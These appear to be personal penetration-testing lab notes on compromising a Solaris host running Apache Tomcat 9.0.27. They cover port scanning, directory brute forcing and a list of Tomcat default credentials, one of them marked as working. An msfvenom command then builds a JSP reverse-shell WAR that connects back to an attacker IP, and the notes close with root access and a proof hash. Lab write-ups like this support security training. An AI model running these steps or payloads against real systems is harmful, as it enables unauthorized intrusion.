```

┌──(root㉿kali)-[/home/kali/Downloads]
└─# rustscan -a 10.11.1.209
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.11.1.209:22
Open 10.11.1.209:111
Open 10.11.1.209:515
Open 10.11.1.209:6787
Open 10.11.1.209:8009
Open 10.11.1.209:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 20:10 EDT
Initiating Ping Scan at 20:10
Scanning 10.11.1.209 [4 ports]
Completed Ping Scan at 20:10, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:10
Completed Parallel DNS resolution of 1 host. at 20:10, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 20:10
Scanning 10.11.1.209 [6 ports]
Discovered open port 22/tcp on 10.11.1.209
Discovered open port 8080/tcp on 10.11.1.209
Discovered open port 111/tcp on 10.11.1.209
Discovered open port 6787/tcp on 10.11.1.209
Discovered open port 515/tcp on 10.11.1.209
Discovered open port 8009/tcp on 10.11.1.209
Completed SYN Stealth Scan at 20:10, 0.10s elapsed (6 total ports)
Nmap scan report for 10.11.1.209
Host is up, received echo-reply ttl 254 (0.058s latency).
Scanned at 2023-03-28 20:10:57 EDT for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
111/tcp  open  rpcbind    syn-ack ttl 63
515/tcp  open  printer    syn-ack ttl 59
6787/tcp open  smc-admin  syn-ack ttl 59
8009/tcp open  ajp13      syn-ack ttl 59
8080/tcp open  http-proxy syn-ack ttl 59

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
           Raw packets sent: 10 (416B) | Rcvd: 15 (612B)

```
```shell
# nmap portion of rust scan

PORT     STATE  SERVICE  VERSION
53/tcp   closed domain
111/tcp  open   rpcbind  2-4 (RPC #100000)
515/tcp  open   printer
6787/tcp open   ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)
| http-title: Solaris Dashboard
|_Requested resource was https://10.11.1.209:6787/solaris/
| ssl-cert: Subject: commonName=kraken
| Subject Alternative Name: DNS:kraken
| Not valid before: 2019-11-07T18:40:00
|_Not valid after:  2029-11-04T18:40:00
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14
8009/tcp open   ajp13    Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open   http     Apache Tomcat 9.0.27
|_http-title: Apache Tomcat/9.0.27
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.95 seconds
```

```shell

gobuster dir -u http://10.11.1.209:8080 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
```











```shell
# trying default creds
Apache Tomcat Default Credentials
Username 	Password
	admin 	password 
	admin 
	admin 	Password1
	admin 	password1
admin 	admin
admin 	tomcat
both 	tomcat
manager 	manager
role1 	role1
role1 	tomcat
role 	changethis
root 	Password1
root 	changethis
root 	password
root 	password1
root 	r00t
root 	root
root 	toor
tomcat 	tomcat
										tomcat 	s3cret    - these creds worked.
tomcat 	password1
tomcat 	password
tomcat 	
tomcat 	admin
tomcat 	changethis
```

![[1. bruteforce login.png]]

```shell
#server information

Apache Tomcat/9.0.27 	
1.8.0_181-b12 	
Oracle Corporation 	
SunOS 	5.11 	
amd64 	
Hostname: kraken 	
IP 10.11.1.209
```

```shell
# have to upload a .war file.

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.157 LPORT=7676 -f war -o revshell.war

#uploaded and deployed bonto server

on as root, got proof.

cat proof.txt
657dd1ac919a586169dd8bf519d3429f
```

![[2. proof.txt.png]]